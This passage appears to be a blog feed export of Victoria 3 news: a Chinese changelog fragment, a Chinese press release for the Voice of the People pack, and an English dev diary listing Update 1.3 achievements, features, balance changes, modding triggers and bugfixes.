已添加新触发器 can_ruler_have_command 来决定统治者是否可以授权指挥国家的军队<br>● 新触发器 investment_pool_net_income &amp; investment_pool_gross_income<br>● 法律的 ordered_preferred_law 脚本列表会按范围中利益集团支持度分类<br>● 已添加控制台会记录已结束战斗的指令<br>● 已添加建筑数量、总建造等级和世界人口记录的全球失业人口<br>● 已添加 has_monarch_ideology 脚本化触发器<br>● land_hq 触发器现在也可在地区范围中调用</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-38-1024x133.png"></p><h2 id="错误修正"><a href="#错误修正" class="headerlink" title="错误修正"></a>错误修正</h2><p>● 现在不能再招募指挥官到临时总部<br>● 修正许多人口、效忠派或激进派数值可能溢出的情况<br>● 修正人口概览面板中的税种标签<br>● 修正农奴制仅解锁农奴制生产方式选项而不是自动强制实施的错误<br>● 由于投降而已经实施的战争目标，现在不能在和平协议中再次提出。<br>● 修正允许超过建筑等级上限的错误<br>● 政权更迭战争目标现在应该会正确地创建一个与战争目标持有者至少有一个共同利益集团的政府，并迫使他们在实施后不久重新评估其政治战略<br>● 涉及战争的警告现在会在点击后打开正确的面板，而非无反应<br>● 效忠派和激进派的提示信息数字修正为按预期显示为红色和绿色<br>● 抗命的沙文主义者事件现在会增加紧张局势，而不是引发原住民暴动<br>● 橡胶种植园现在会受到鼓励资源产业地区法令的影响<br>● 修正游戏会尝试重置只读 (无效) 范围对象中脚本变量而崩溃的问题。<br>● 附庸国现在只能支持他们的宗主国作为统一候选者<br>● 吞吐量增益的下限现在是 -1 (也就是完全没有产能)，而非规定吞吐量增益仅限于正数<br>● 降低捕鲸站死亡率<br>● 修正国内安全法律中的几个错误<br>● 修正利益集团面板上政党名称溢出的问题<br>● 修正清理指挥官命令期间可能发生的问题<br>● 德意志地区如果在维多利亚登基前离开，将不再被迫进入汉诺威市场<br>● 御一新日志条目现在要求日本是君主制<br>● 流氓帝国主义者和殖民地冲突事件现在每个国家只能触发一次<br>● 修正保存游戏窗口开启时游戏退出可能发生崩溃回到桌面的问题<br>● 女权主义和父权主义者现在对女性权利&#x2F;言论自由的立场凌驾于自由主义者等基本意识形态的任何立场之上<br>● 修正如果所有潜在目标都在关税同盟中，则无法发动统一博弈的问题<br>● 被占领地块的战斗修正和康复率现在可以正常运作<br>● 人民之春事件 5 不可再重复适用于同一地区，现在仅适用于整合的地区<br>● 将摩尔文化重命名为比丹，并更改文化特质以更符合历史。<br>● 修正尚未建造的建筑会显示未能雇佣警告的错误<br>● 默认情况下，脚本化的 army_size 链接不会再包括征召军，这应该会修正教程和几个 AI 脚本背后的假设 (新链接 army_size_including_conscripts 现在涵盖了以前的用例)<br>● 修正教程中多个缺漏或错误的用户界面高亮显示<br>● 已为各处的利益集团按钮添加正确的利益集团提示信息<br>● 由于破面问题，已从利益集团提示信息的利益集团图标中移除执政图标<br>● 修正许多游戏概念的各种本地化小错误 (拼写、语法、措辞等)<br>● 更改海上入侵战斗面板的副标题，以提及海上入侵而非战斗<br>● 在刺杀事件中，如果刺客的目标死于其他原因，事件现在会正确地失效<br>● 修正 modifier_unit_supply_consumption_mult 的本地化字符串<br>● 罗马尼亚不再是个适合分离主义者的国家<br>● 坦齐马特：镇压分离主义现在会在分离进度超过 50% 时失败<br>● 修正“显示无效的游戏存档”复选框无效的问题。<br>● 修正资助协定意外取消的错误<br>● 修正游戏重新加载才会更新角色新特质的错误<br>● 修正占领一个通过海峡与孤岛相连的地块会导致分裂占领的错误<br>● 修正研究奎宁殖民地后进展速度未更新的问题<br>● 修正没有选举的国家会没有保存最后改革日期的错误<br>● add_pollution 效果现在会显示正确的污染量了<br>● “无效”的角色不会再随时间获得技能特质<br>● 突厥斯坦现在会将伊犁地区算在可能成立突厥斯坦的地区列表中<br>● 不再需要先释放也门才能释放外高加索了<br>● 移除家畜牧场吞吐量修改项的重复部分<br>● “危险设备”和所有其他 pm_events 现在有五年的冷却时间<br>● “善意烧信”事件的选项 C 不会再出现没完没了的错误<br>● 已从 goldrush.5 的名称移除 NULL_OBJ<br>● 一旦被击败，印度兵变现在不会再留下未整合的邦给东印度公司<br>● 印度兵变不再导致东印度公司有两个吞并战争目标<br>● bic_breakup.1 事件在条件满足的情况下不会再每月触发<br>● bic_breakup.1 事件现在会在泛民族主义选项中正确地将虔信者切换为印度教上师<br>● 修正童工事件中的几个错误<br>● 解决心理事件链中的几个问题<br>● 在“边缘化”的概念提示信息中加上缺失的图标<br>● 罗得岛林业中心现在有名字了<br>● 修正加载游戏存档的确认窗口在加载游戏界面外仍会保持开启状态的问题<br>● 修正尼加拉瓜、的黎波里和考卡条约港未正确定义的问题<br>● 修正鸦片战争胜利事件有时会缺少标题的错误<br>● 修正某些教程课程会参考至空对象的情况<br>● 修正如果北日耳曼联邦&#x2F;南日耳曼联邦在德国形成的过程中出现，基于不同联合者而成形的自定义德意志旗帜会无法正常运作的错误<br>● italian_unification.1.b 现在会使用正确的本地化项了<br>● 修正会在考察完结事件中引发范围问题的状况</p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 更新日志 </tag>
            
            <tag> 维多利亚3 </tag>
            
            <tag> 1.3 </tag>
            
            <tag> 战犯 </tag>
            
            <tag> 维多利亚2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《Victoria 3：Voice of the People》现已推出</title>
      <link href="/165b70f5.html"/>
      <url>/165b70f5.html</url>
      
        <content type="html"><![CDATA[<p>斯德哥尔摩 - 2023 年 5 月 22 日 - 在《Victoria 3》的新沉浸体验包</p><p>“Voice of the People”中，历史著名的人物会为其支持的游说，让您沉浸在 19 世纪的世界之中。今日推出。许多全新历史人物加入，让您为维多利亚时代谱写耐人寻味的新历史，去挑战权威。</p><p>《Victoria 3》是 Paradox Interactive 制作的大型战略模拟游戏，以安德鲁·杰克逊到第一次世界大战间百年的社会为背景。玩家引领一个史实国家的产业、政治和社会发展，在与时俱进的同时，您的计划也将受到挑战。在 Voice of the People 中，全新鼓动者机制加入了新的角色，也对该世纪的法国政治进行了更深入的模拟，以新事件、任务等更添历史风味。</p><p>《Victoria 3: Voice of the People》特色包含：</p><p>超过 60 名历史中的全新鼓动者：以约翰·布朗、艾米琳·潘克斯特和伊斯麦尔·恩维尔帕夏等真实的历史人物探索全新历史版本。全新且免费的鼓动者系统整合了这些角色，让贵国的发展更加多元且更有高参与。</p><p>特殊鼓动者行动：提拔合作组织对其提供帮助，也可以流放他们以减弱他们的影响力。在某些情况下，您还可以邀请别国的流放人士加入您的社会，从而利用他们的思想。</p><p>独特的法兰西内容：以法国历史为灵感的新事件、日志任务和决议。您可以充分利用在北非的优势，支持一位皇室继承人，也可以在欧洲和世界版图建立强大的国家。</p><p>新法兰西建筑：法国历史建筑物加入地图。</p><p>新美术：Voice of the People 特色纸质地图，以前所未见的新艺术运动风格呈现。新的动画着重刻画反抗的组织，也为许多社群加入了新服装和制服。</p><p>Voice of the People 发布同时也有《Victoria 3》免费重大更新，所有《Victoria》玩家都可获得。此次更新包含全新鼓动者系统，可以让个别人物推进历史进程。此外还为法国加入新的时代背景、世界地图更改、立法和革命流程革新，以及其他种种变化。</p><p>《Victoria 3: Voice of the People》将在 2023 年 5 月 22 日推出，建议售价 $14.99&#x2F;£12.99&#x2F;€14.99。</p><p>Paradox Interactive 也公告了《Victoria 3》的全新 Expansion Pass，其中包含 Voice of the People、两个已发布的装饰包、一个即将推出的美术包、还有即将发布的第一次游戏重大扩展。这个捆绑包让分开购买每件商品变得非常划算。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-27.png"></p><p>《Victoria 3》Expansion Pass 内含：</p><p>American Buildings Pack：在许多方面来说，19 世纪都是美国的时代，包含大陆扩张、人口迅速增长，以及海外帝国的兴起。本组合包内含美国的独特建筑模型、其他建筑的特殊美国设计和美国国会大厦地标。</p><p>Melodies for the Masses：以维多利亚时代的人民为灵感，这一系列的音乐汲取自农场与城镇的声音。沉浸在音乐的反思中，感受本来主宰了社会的乡村世界，直到工厂的兴起和汽笛发出鸣叫。</p><p>Voice of the People：本《Victoria 3》沉浸体验组合包在游戏中添加了更多历史内容，包含超过 60 名可以通过鼓动来改变社会的历史角色。马志尼与列宁等主要的历史人物都可能在您的国家中揭竿而起，推动他们的议程，可能与您同盟也可能与您对立。《Voice of the People》也包含法兰西的全新历史内容，例如事件、政党以及独特的历史决议与日志条目。全新美术包含法兰西建筑模型、一张新的纸质地图以及一个全新的用户界面主题。</p><p>Dawn of Wonder：从日出的光芒到煤气灯的亮光，本美术包以光与影为主题，为视觉体验增添了新的生命。昼夜循环标志着您在游戏中花费的时间，而闪耀着新生命的其他图像也作为新时代的曙光呈现在美术上。</p><p>Sphere of Influence：在更文明的时代，笔尖应当胜于干戈。《Victoria 3》的第一个大型扩展包增加了深度以及外交游戏的沉浸体验。建立权力集团来保护地区利益以及投资外国经济。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-28.png"></p>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dlc </tag>
            
            <tag> 维多利亚3 </tag>
            
            <tag> 人民之声 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Victoria 3 - Dev Diary</title>
      <link href="/1945.html"/>
      <url>/1945.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-15-1024x576.png"></p><p>Hello and welcome to our final development diary before the release of Voice of the People and Update 1.3 on May 22! Today I have the pleasure of announcing the full list of changes made for both the Immersion Pack and the free update.</p><p>But first, let’s talk about new Achievements! We have 15 new challenges for you, 7 of which are exclusive to Voice of the People and 8 that are also valid for the base game.</p><h3 id="New-Achievements-for-Voice-of-the-People​"><a href="#New-Achievements-for-Voice-of-the-People​" class="headerlink" title="New Achievements for Voice of the People​"></a>New Achievements for Voice of the People​</h3><p><strong>It Never Ends</strong>: Cement the Bonaparte dynasty, become a Republic, and Stamp Out Monarchism</p><p><strong>Hexagon No More</strong>: Complete the Natural Borders of France Journal Entry</p><p><strong>Emperor Norton</strong>: As the USA, become a Monarchy with Joshua Norton as monarch</p><p><strong>Shut the Door Behind You</strong>: Have an invited Exile become the ruler of your nation and pass the Closed Borders Law</p><p><strong>Crush the Commune</strong>: As France, defeat the rebellion of the Paris Commune</p><p><strong>Military Junta</strong>: Have the Armed Forces coup the government</p><p><strong>Huge Ego, Sorry</strong>: Unite Germany and have Max Stirner rule your nation</p><h3 id="New-Achievements-for-Update-1-3​"><a href="#New-Achievements-for-Update-1-3​" class="headerlink" title="New Achievements for Update 1.3​"></a>New Achievements for Update 1.3​</h3><p><strong>Agitate Elsewhere</strong>: Exile an Agitator with at least 100 Popularity</p><p><strong>Amish Paradise</strong>: As a Yankee nation, pass the Industry Banned Law before 1846 and have at least 20 average Standard of Living</p><p><strong>Authoritarian</strong>: Pass the Single-Party State, Militarized Police, and Outlawed Dissent Laws</p><p><strong>Breadbasket</strong>: Pass the Homesteading Law and be the leading producer of Grain and Groceries</p><p><strong>Euphoric</strong>: Pass the State Atheism Law and have the Intelligentsia be Powerful</p><p><strong>L’Allemagne, c’est Rien</strong>: As France, prevent Germany from unifying until 1930</p><p><strong>Meiji Restoration</strong>: Complete the Restoration Journal Entries as Japan before 1912</p><p><strong>Vox Populi</strong>: Pass a Law with the support of an Agitator</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-16-1024x133.png"></p><h2 id="Major-Features-in-Voice-of-the-People​"><a href="#Major-Features-in-Voice-of-the-People​" class="headerlink" title="Major Features in Voice of the People​"></a>Major Features in Voice of the People​</h2><ul><li>60+ Historical Agitators</li><li>Many new Journal Entries and events relating to France, including dynastic squabbles, the colonization of Algeria, the Dreyfus Affair, the Paris Commune, and more</li><li>French building model set</li><li>New UI theme inspired by Art Nouveau</li><li>New paper map and map room look &amp; feel</li><li>New outfits for historic and generic characters</li><li>City hub VFX for revolutions depending on which Interest Groups are revolting</li><li>Over a dozen new event images</li><li>Character interactions for making an Agitator an Interest Group leader or granting them military command</li><li>Character interaction to force a monarch to Abdicate under certain conditions</li><li>“Coup!” Journal Entry that can cause angry Interest Groups in government to seize power</li><li>New events about the adventures of Guiseppe Garibaldi</li><li>7 new Achievements</li></ul><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-17-1024x133.png"></p><h3 id="Major-Features-in-Update-1-3​"><a href="#Major-Features-in-Update-1-3​" class="headerlink" title="Major Features in Update 1.3​"></a>Major Features in Update 1.3​</h3><ul><li>Agitator characters (new role) that create or empower Political Movements</li><li>Ability to invite Agitators exiled by other countries</li><li>New ‘Character Interaction’ system adds ability to interact directly with characters in your country (script extensible for modders)</li><li>Character Interactions: Exile Character, Repatriate Exile, Royal Marriage</li><li>Reworked Law Enactment mechanic, putting a law through three phases before it is passed</li><li>Reworked Revolution Progression mechanic with a plethora of new Revolution events</li><li>Politics Overview Panel overhaul providing easier overview of your Loyal and Radical Interest Groups, among other enhancements</li><li>New Political Movements panel giving you a breakdown of supporting Interest Groups, Agitators, and Pops</li><li>New Revolution map marker and visuals</li><li>New Law group: Land Reform</li><li>New Church &amp; State Law: State Atheism</li><li>New Distribution of Power Laws: Single-Party State, Technocracy</li><li>New Economic System Law: Industry Banned</li><li>“Petition” Journal Entry lets Interest Groups in government encourage the passing of their desired laws</li><li>Country border rework for France, Algiers, parts of Africa and Germany</li><li>8 new Achievements</li></ul><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-18-1024x133.png"></p><h3 id="Improvements​"><a href="#Improvements​" class="headerlink" title="Improvements​"></a>Improvements​</h3><ul><li>Added a “Supported Law Cancelled” modifier that radicalizes a placated movement when their law enactment is cancelled</li><li>Political Movements can no longer become revolutionary without the support of an Interest Group</li><li>Added an effect to create more radicals from Standard of Living changes when a country has negative Authority</li><li>Added Opium growing potential to states in Ottoman Empire, Mexico, New Granada and Van Diemen’s Land</li><li>Characters are more likely to become opium addicts if their culture is obsessed with opium</li><li>Freed Afro-American&#x2F;Caribbean&#x2F;Brazilian etc. nations now get an event that ensures slavery is almost always abolished in their nation</li><li>Added Coal and Gold potential to Morocco and the Sahara to account for historic coal and silver fields</li><li>Added Whaling Station potential to a few states around the world based on historic catch data</li><li>Buildings with low cash reserves, at least 10% employment, and low profits will now avoid hiring more employees, as this would often result in those employees then being fired a few weeks later</li><li>Female leaders of Interest Groups will now only show up after Women’s Suffrage is passed (unless they are generated by special content such as the struggle for said suffrage), to better reflect historical disenfranchisement of women in politics</li><li>Base enactment time of various law groups adjusted to match new 3-phase enactment system</li><li>Populated the database with historical Scandinavian IG leaders, admirals, and generals</li><li>Haitian and Dominican population numbers and cultures have been updated to better reflect the situation in 1836</li><li>Updated population numbers in Belgium and the Netherlands to be more historically accurate</li><li>Montenegro has been shrunk even more to better reflect 1836 borders</li><li>Russian generals now have defined ideologies and interest groups</li><li>Updated the names and locations of hubs in Japan, Sakhalin and Taiwan to be more historically accurate</li><li>Revised the starting setup around the Lower Niger River and Mozambique</li><li>Auto expanding buildings will no longer evaluate the length of the construction queue but only check that Cash Reserves and Market Access are above 95%</li></ul><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-19-1024x133.png"></p><h3 id="AI​"><a href="#AI​" class="headerlink" title="AI​"></a>AI​</h3><ul><li>Fixed a bug that was preventing some AIs with high budget surpluses from constructing high-priority government buildings such as Construction Sectors</li><li>AI (and Autonomous Investment) is now much more averse to overbuilding in states that don’t have the infrastructure to support it</li><li>AI (and Autonomous Investment) will no longer continue to build railway buildings in states that have full market access but no workforce to support new buildings</li><li>AI is now better at prioritizing universities and innovation generation, particularly at using the more advanced University PMs</li><li>AI now has a greater tendency to make ‘return state’ wargoals into primary wargoals, particularly in cases when they’re trying to complete a journal entry</li><li>Fixed an issue where the AI would repeatedly declare and then break rivalries</li><li>AI is now less inclined to seize Treaty Ports without having a strong reason to want them</li><li>AI is now more keen to rival countries back if they don’t have the Conciliatory attitude</li><li>Peace evaluation AI no longer considers already enforced war goals as missed opportunities</li></ul><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-20-1024x133.png"></p><h3 id="Balance​"><a href="#Balance​" class="headerlink" title="Balance​"></a>Balance​</h3><ul><li>Greatly expanded weights for when pops will join Political Movements independently of their Interest Groups</li><li>Monarchs and heirs now have a variety of factors affecting which Interest Group they are aligned with</li><li>Non-Commander characters are now less likely to become Wounded</li><li>Reduced the chance of Bankrolling giving you an obligation each week from 1% to 0.2%</li><li>Increased the number of radicals generated when conquering states that are not both homelands and a claim of the conqueror</li><li>Caudillismo ideology now favors Presidential Republic</li><li>Corn Laws now requires significantly expensive grain prices, and grants a Market Liberal Landowner Agitator rather than an IG leader</li><li>Landowner and Industrialist characters are more likely to have Expensive Tastes</li><li>Officers now gain Political Strength from the Autocracy law</li><li>Raised maximum personality traits for characters to 2 and reduced maximum skill traits for characters to 2</li><li>Council Republic now gets some Legitimacy from share of votes</li><li>Presidential Republic now gets a Legitimacy bonus for having head of state in government, but slightly less legitimacy from share of votes</li><li>Pops working in Subsistence Buildings now have the impact of Expected Standard of Living from Literacy greatly decreased</li><li>Reduced tech costs in era 4 and 5 to make it not quite so difficult to reach endgame tech</li><li>British East India now starts with railways technology</li><li>Interest Groups will now have a slightly higher tendency to support political movements if an Agitator of that interest group is supporting the political movement</li><li>Support for Multiculturalism is now found in the Humanitarian ideology</li><li>Various personality traits are now incompatible with each other</li><li>Added Logging Camp potential to Connecticut</li><li>Significantly reduced the speed at which characters gain skill traits over time, particularly if they are exiles or commanders in the recruitment pool</li><li>Several more building types are now subject to Dangerous Working Conditions</li><li>Adjusted pop attraction for the Devout Interest Group</li><li>Muslim characters are now less likely to become Alcoholics</li><li>Radical ideology no longer has a stance on Citizenship laws</li><li>Sepoy Mutiny is now a normal Diplomatic Play rather than an instant war</li><li>Industrial Barriers event now targets only notable minorities</li><li>Reduced throughput modifier on “Industrial Safety Slowdowns” from 50% to 10%</li><li>Changed the requirements of The Gamble to require multiple Interest Groups in government</li></ul><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-21-1024x133.png"></p><h3 id="Art​"><a href="#Art​" class="headerlink" title="Art​"></a>Art​</h3><ul><li>Added an option to enable an alternate occupation visual (stripes instead of flags) under Game settings</li><li>Added visual planes flying over the military units for the Aerial Reconnaissance production method</li><li>Military visual effects overhaul</li><li>Children now wear unique age-appropriate clothing</li><li>Heirs in monarchies are no longer bald and clean-shaven throughout their entire lives</li><li>Revised clothing weighting so children do not wear clothes that clip through their bodies</li><li>Tweaked pollution VFX</li><li>Louis Delescluze is now prohibited from wearing hats</li><li>Added Garibaldi’s red shirts as dynamic soldier and officer pop clothing</li><li>Added a late-game uniform variant for the United States</li></ul><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-22-1024x133.png"></p><h3 id="Interface​"><a href="#Interface​" class="headerlink" title="Interface​"></a>Interface​</h3><ul><li>Updated the Law tab, Law Group panel, and the Law Enactment outliner item with the improved Law Enactment system</li><li>Attached the associated Law enactment events to the Law enactment item in the outliner for much better visibility and feedback</li><li>Attached the associated Revolution events to the Revolutionary Political Movement item in the outliner for much better visibility and feedback</li><li>Improved the layout of the Interest Group panel</li><li>More informative tooltips for Political Movements and Revolutions</li><li>Combined Radicals and Loyalists graphs into one and make sure to always show this graph instead of the old one</li><li>Reworked the Law Enactment popup to actually be readable now</li><li>Added the outcome of the Law Enactment checkpoint to the Law Enactment event that spawned because of it for better feedback of what has happened</li><li>Added a State Construction Summary Map Marker for when there is more than one Building being actively expanded in a State, to reduce the amount of Construction Map Markers covering the map</li><li>Sort the entire Modifier databases to make tooltips more readable throughout the entire game</li><li>Added more information of any supported Political Movements on the Interest Groups themselves and their tooltips</li><li>Added the State’s urbanization value to State tooltip and Urban Center building tooltip</li><li>Made several changes and tweaks to Alerts and Current Situation items to make them less spammy and more informative, including deactivating a few and moving their information to more appropriate places throughout the UI</li><li>Added functionality to unhide all Important Actions you have previously hidden</li><li>Added button to ‘hide’ an Important Action in the Current Situation window</li><li>Improved the Pop Support tooltip for politically inactive and total support number</li><li>Improved the Reform Government suggested options buttons and make it clearer which one is currently selected</li><li>Potential time-out results of Journal Entries can now be seen at the bottom of the corresponding Journal Entry panel if it has any</li><li>Added background colors for Journal Entry completion and failure effects</li><li>New game concept ‘Neutral’ has been added to explain the middle step of Loyalism&#x2F;Radicalism better</li><li>Renamed Politically Inactive to Politically Unaligned to better describe what it means</li><li>Fixed an issue where a save made in the observer mode would look broken in the launcher</li><li>Fixed that the white peace button would always appear as if the AI would not accept it</li><li>Added Trade Route size trend indicator to the Trade Route list items</li><li>Liberate Country wargoal will now highlight the country being liberated on the map</li><li>Character tooltips have been updated with all relevant information for Agitators and Political Movements</li><li>Made the subtitles of all left side panels be consistent and have go-to buttons to relevant things if possible</li><li>Added the government&#x2F;opposition stance to the top of Interest Groups’ tooltips</li><li>Improved the tooltip for Research Queued</li><li>Right click menus are now accessible for all characters since there can be character interactions available for foreign characters or characters that are in the exile pool</li><li>Map interactions for Buildings you cannot expand further now have the padlock status and are not moved to the Unavailable Options list</li><li>Map interactions for Decrees are now default sorted by state name</li><li>Map interactions for Diplomatic Actions are now default sorted by country name</li><li>Map interactions status checkmark + red cross was removed from the UI and is now displayed as just a red cross</li><li>Map interactions status were reworked to prevent items from jumping from Available to Unavailable options in most cases</li><li>Added Expected Standard of Living to the State Standard of Living tooltip</li><li>Added Fancy Tooltip for Battle Conditions</li><li>Added Important Action for States with a high amount of Pops living under their Expected Standard of Living</li><li>Sort Decisions that can be taken on top of the Decision list</li><li>Migration Target Map Markers are now visible when zoomed further out</li><li>Cut down the amount of decimals for several Modifiers in order to make them more readable</li><li>Show Acceptance description for Citizenship and Church and State laws at the top of those Law tooltips</li><li>Show number of Battalions that can be Mobilized at the top of the Army Model and Internal Security Law tooltips</li><li>Reverse the order of the Ideology stances in the Ideology tooltip to show the Laws that Ideology approve of before the ones they disapprove of</li><li>Added Expected Standard of Living to the State Standard of Living tooltip</li><li>Players can now pin any market they desire to the outliner in the market panel</li><li>Improved map list panel for rivalry action</li><li>Added DLC icons with activation status and Steam store links to the main menu</li><li>Improved the Character right-click menu</li><li>Moved the “This option will be auto-picked” icon to the other side of the button in order to make it easier to get into the nested tooltip for that option</li><li>State Traits now shown as Map Markers in the Production Lens</li><li>Unrealized Taxes breakdown now shown in the Budget Panel</li><li>Interest Groups that support a Law are now shown on the first level of the Law tooltip</li><li>Fixed a bug where maplist highlight was not removed on mouse leave</li><li>The GDP chart now shows Yearly GDP instead of Weekly GDP, matching what’s shown in the topbar</li><li>Empty values in initial land&#x2F;naval battle size tooltips are now omitted</li><li>Fixed that an observer would see the game over screen if the country that they are observing was annexed</li><li>Improved the Current Situation for low standard of living</li><li>Made the Election panel handle more than 3 Parties</li><li>Trimmed recruitable commander tooltip</li><li>The ‘Gold Reserves’ widget in the budget panel is no longer empty when you have no gold reserves, instead just showing an empty bar</li><li>Removed (almost) unused highlight from Technologies</li><li>Added new background to map list options</li><li>Fix sidebar from opening too eagerly in some languages</li></ul><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-23-1024x133.png"></p><h3 id="Narrative-Content​"><a href="#Narrative-Content​" class="headerlink" title="Narrative Content​"></a>Narrative Content​</h3><ul><li>New dynastic Ideologies for France: Orleanist, Legitimist, and Bonapartist</li><li>New Ideologies: Positivist, Luddite, Socialist</li><li>Added Humanitarian, Protectionist, Jacksonian Democrat, and Authoritarian leader ideologies Socialist Ideology is now added to the Trade Unions after researching Socialism</li><li>Journal Entries are now inherited by a victorious revolution, meaning that JEs such as China’s ‘Fragile Unity’ will not be abruptly ended if the Qing government is overthrown in a revolution</li><li>Major revisions to the Journal Entries surrounding German Unification. The process of annexing German minors through Customs Unions has been removed, and instead the JEs much more closely follow the historical narrative, starting with the Schleswig-Holstein question and allowing for annexation of North&#x2F;South German minors only on the completion of the German Leadership War</li><li>Implemented a journal entry and variety of events for nihilist movements</li><li>Updated and expanded the Belle Époque journal entry</li><li>Nihilists now support State Atheism</li><li>Added Ruhr State Region</li><li>Added Rhineland releasable nation</li><li>Made Grand Exhibition more playable, removed inconsistencies, provided bonus to techs researched during the Journal Entry</li><li>Added events that retire agitators that no longer serve a purpose</li><li>Added events about the passing of Land Ownership laws</li><li>Added events about the passing of Industry Banned laws</li><li>Added some agitators present at game start</li><li>Added several events that allow for interaction with exiles</li><li>Added events that fire when you have an ongoing revolution</li><li>Added Franco-Provencal culture</li><li>Added additional character traits</li><li>Reduced the frequency of the ‘Arming the Natives’ Patagonia event, but made the effects more impactful.</li><li>Added Savoy releasable, for Franco-Provencal lands</li><li>Abe Lincoln only appears as an Interest Group leader when he’s old enough to be President</li><li>Specified Switzerland’s religion as Protestant, but gave it more explicitly Catholic leaders as well</li><li>Changed “Swiss” culture to “Alemannic”, and changed all keys referring to Swiss culture</li><li>Converted the French history character file to solely use character templates</li><li>Added Flag for the USA if it were to be formed by California</li><li>Added new flags for communist California and if California controls Baja California</li></ul><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-24-1024x133.png"></p><h3 id="Performance​"><a href="#Performance​" class="headerlink" title="Performance​"></a>Performance​</h3><ul><li>Improved performance of tutorial highlights</li><li>Map particle optimization</li></ul><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-25-1024x133.png"></p><h3 id="Modding​"><a href="#Modding​" class="headerlink" title="Modding​"></a>Modding​</h3><ul><li>All logging console commands are now renamed to start with “Logging.” and log output in a standardized way</li><li>Added Character.IsInExilePool and Character.IsExile for gui and loc scripting</li><li>Added new effect exile_character</li><li>Added new effect remove_character_role</li><li>Added the ability to scope to a character’s home country (as opposed to their current country) via home_country</li><li>Added new triggers is_exile and is_in_exile_pool</li><li>Added political_movement link from a character to the movement they support and supporting_character link in the other direction</li><li>Ideologies can now have a priority value set, which determines which ideology is used when two non-leader ideologies have a stance on the same law group</li><li>Added a has_template trigger that can be used on characters to check if they are a certain template</li><li>Added new gui and loc script functions to access an exile’s home country and interest group type</li><li>The trigger is_interest_group_type can now also be used in character scope (this is useful for exiles)</li><li>Added scripted weight ai_enact_weight_modifier to laws that allows direct modification of the AI’s weight to enact that law</li><li>Added an on_action for when a law enactment a political movement supports is cancelled</li><li>Added a cancel_enactment effect</li><li>Added new trigger can_ruler_have_command to determine if a ruler can be granted command of the country’s armies</li><li>New triggers investment_pool_net_income &amp; investment_pool_gross_income</li><li>ordered_preferred_law scriptlist for laws sorted by scoped Interest Group approval</li><li>Added a console logging command for concluded battles</li><li>Added number of buildings, total building levels, and number of global unemployed pops to world population log</li><li>Added a has_monarch_ideology scripted trigger</li><li>land_hq trigger can now also be called in state scope</li></ul><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/05/image-26-1024x133.png"></p><h3 id="Bugfixes​"><a href="#Bugfixes​" class="headerlink" title="Bugfixes​"></a>Bugfixes​</h3><ul><li>It is no longer possible to recruit Commanders to temporary HQs</li><li>Fixed many instances where population, loyalists, or radicals values could overflow</li><li>Fixed labels for Tax Types in the Population Overview panel</li><li>Fixed a bug where Serfdom only unlocks Serfdom PM options rather than automatically enforce it</li><li>A war goal that has already been enforced (due to capitulation) can no longer be pressed again in peace deals.</li><li>Fixed a bug that allowed to exceed a building’s max level cap</li><li>The Regime Change wargoal should now correctly create a government that has at least one shared Interest Group with the wargoal holder and force them to re-evaluate their political strategy shortly after being enforced</li><li>Alerts referring to wars will now open the correct panel when clicked rather than do nothing</li><li>Made loyalists and radicals tooltip numbers be red and green as intended</li><li>Insubordinate Jingoist event now adds tension instead of creating a native uprising</li><li>Rubber plantations are now affected by the Encourage Resource state decree</li><li>Fixed a crash where the game would try to reset script variables in a read-only (invalid) scoped object.</li><li>Subject countries can now only support their overlord as a unification candidate</li><li>The lower bound for throughput bonus is now -1 (in other words no throughput at all), rather than throughput bonus being capped to only positive values</li><li>Reduced Whaling Stations mortality</li><li>Fixed several bugs in the Internal Security laws</li><li>Fixed overflow of party name on Interest Group panel</li><li>Fixed issues that could happen during clean up of a commander’s orders</li><li>German States will no longer be forced into Hannover’s market if they left before Victoria comes to power</li><li>Honorable Restoration JE now requires that Japan is a monarchy</li><li>Rogue Imperialist and Colonial Clash events can now trigger only once per country</li><li>Fixed the potential crash-to-desktop on game exit when the save game window was open</li><li>Feminism and Patriarchal Suffrage now have their stances on Rights of Women&#x2F;Free Speech override any stance from base ideologies, such as Liberal</li><li>Fixed an issue that prevented Unification play from being launched if all potential targets were in a Customs Union</li><li>Battle modifiers for captured provinces and recovery rate now work correctly</li><li>People’s Springtime.5 event can no longer apply to the same state twice, and now applies only to incorporated states</li><li>Renamed the Maures culture to Bidan, and changed cultural traits to fit history more accurately.</li><li>Fixed a bug where buildings that have not been constructed yet would show an alert for being unable to hire</li><li>Scripted army_size link no longer includes conscripts by default, which should fix tutorial and the assumptions behind several AI scripts (new link army_size_including_conscripts now covers the previous use case)</li><li>Several missing or wrong UI highlights during the Tutorial have been fixed</li><li>Added the correct Interest Group tooltip for Interest Group buttons everywhere</li><li>Removed the in-government icon from the Interest Group icon on the Interest Group tooltip due to clipping</li><li>Fixed various small localization errors (spelling, grammar, phrasing etc.) across a number of game concepts</li><li>Changed the Naval Invasion Battle panel subtitle to mention Naval Invasion instead of battle</li><li>Assassination events now correctly invalidate if the assassin’s target dies from other causes</li><li>Fixed loc string for modifier_unit_supply_consumption_mult</li><li>Romania is no longer a valid country for secessionists</li><li>Tanzimat: Suppress Separatism now fails with over 50% secession progress</li><li>Fixed an issue where the “show invalid savegames” checkbox 